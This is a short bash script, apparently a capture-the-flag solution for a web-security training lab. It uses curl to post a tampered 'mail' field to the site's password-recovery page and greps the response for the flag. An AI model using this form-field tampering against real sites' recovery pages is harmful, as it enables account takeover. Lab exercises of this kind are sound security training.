#!/usr/bin/env bash

URL_ROOT="${URL_ROOT:-http://10.13.248.102}"
URL="$URL_ROOT/index.php?page=recover#"
curl --data-raw 'mail=admin%40borntosec.com&Submit=Submit' $URL 2>/dev/null | grep "flag" --color=auto
